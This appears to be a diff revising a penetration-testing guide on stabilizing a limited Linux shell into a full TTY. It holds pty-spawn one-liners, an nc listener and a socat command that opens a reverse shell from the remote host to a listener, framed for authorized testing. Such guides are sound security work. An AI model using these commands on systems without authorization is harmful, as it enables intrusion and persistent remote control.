@@ -1,14 +1,22 @@
-# Upgrade a Basic Linux Shell to a Full TTY
+# Stabilize a Basic Linux Shell with a Full TTY
 
-Use this guide only on systems you own or are explicitly authorized to test.
+Use this guide only on systems that you own or are explicitly authorized to
+test.
 
-This is useful after receiving a limited shell through Netcat or a similar tool. A full TTY restores job control, command history, arrow keys, tab completion, terminal resizing, and programs such as `sudo`, `su`, and text editors.
+A limited shell often lacks job control, command history, arrow keys, tab
+completion, terminal resizing, and reliable support for programs such as
+`sudo`, `su`, or text editors. The steps below create a pseudo-terminal and
+restore normal terminal behavior.
+
+> [!IMPORTANT]
+> “Local” means your operator terminal. “Remote” means the authorized shell you
+> are stabilizing. Commands must be entered on the correct side.
 
 ## Quick upgrade
 
 ### 1. Spawn a pseudo-terminal on the remote host
 
-Try the first command available:
+Use the first available command:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -22,18 +30,29 @@ If Bash is unavailable, replace `/bin/bash` with `/bin/sh`.
 
 Press `Ctrl+Z`. You should return to your local terminal.
 
-### 3. Record your terminal size and enable raw mode locally
+### 3. Record the local terminal size
+
+Run locally:
 
 ```bash
 stty size
+```
+
+The result is displayed as `ROWS COLUMNS`. Keep both values for step 5.
+
+### 4. Enable raw mode and return to the remote shell
+
+Run locally:
+
+```bash
 stty raw -echo; fg
 ```
 
-The first command prints `ROWS COLUMNS`. Keep those two numbers for the next step. After `fg`, press `Enter` once or twice if the prompt is not visible.
+Press `Enter` once or twice if the prompt does not immediately appear.
 
-### 4. Finish the setup in the remote shell
+### 5. Finish setup in the remote shell
 
-Replace `ROWS` and `COLUMNS` with the values from `stty size`:
+Replace `ROWS` and `COLUMNS` with the values recorded earlier:
 
 ```bash
 reset
@@ -42,22 +61,23 @@ export TERM=xterm-256color
 stty rows ROWS columns COLUMNS
 ```
 
-You should now have a more stable interactive shell.
+The shell should now support job control, line editing, history, and terminal
+resizing more reliably.
 
-## If the terminal becomes unreadable
+## Recovery if the local terminal becomes unreadable
 
-Run this locally after leaving or backgrounding the remote shell:
+Leave or background the remote shell, then run locally:
 
 ```bash
 stty sane
 reset
 ```
 
-Opening a new terminal also restores normal local terminal settings.
+Opening a new local terminal also restores normal terminal settings.
 
-## Other remote-side PTY methods
+## Alternative remote-side PTY methods
 
-Use one of these only when the matching program is already installed.
+Use an alternative only when the matching program is already installed.
 
 ### Perl
 
@@ -83,45 +103,49 @@ lua -e "os.execute('/bin/bash')"
 expect -c 'spawn /bin/bash; interact'
 ```
 
-## Improve the listener before connecting
+## Improve a local Netcat listener
 
-If `rlwrap` is installed on your local machine:
+If `rlwrap` is already installed locally:
 
 ```bash
 rlwrap -cAr nc -lvnp PORT
 ```
 
-Replace `PORT` with the listener port.
+Replace `PORT` with the authorized listener port.
 
 ## Socat PTY
 
-If Socat is already installed on both machines, it can provide a high-quality TTY directly.
+When Socat is already installed on both systems, it can provide a high-quality
+TTY directly.
 
-On the local machine:
+Run locally:
 
 ```bash
 socat file:"$(tty)",raw,echo=0 tcp-listen:PORT
 ```
 
-On the authorized remote host:
+Run on the authorized remote host:
 
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:HOST:PORT
 ```
 
-Replace `HOST` and `PORT` with the local listener address and port.
+Replace `HOST` with the local listener address and `PORT` with the authorized
+listener port.
 
-## File transfer reference
+## File-transfer reference
 
-Upload a file to the remote host:
+Upload a file to the authorized remote host:
 
 ```bash
 scp -P PORT FILE USER@HOST:DESTINATION
 ```
 
-Download a file from the remote host:
+Download a file from the authorized remote host:
 
 ```bash
 scp -P PORT USER@HOST:REMOTE_FILE LOCAL_DESTINATION
 ```
-y
+
+Use a private destination, verify the transferred file, and remove temporary
+copies when the assessment is complete.
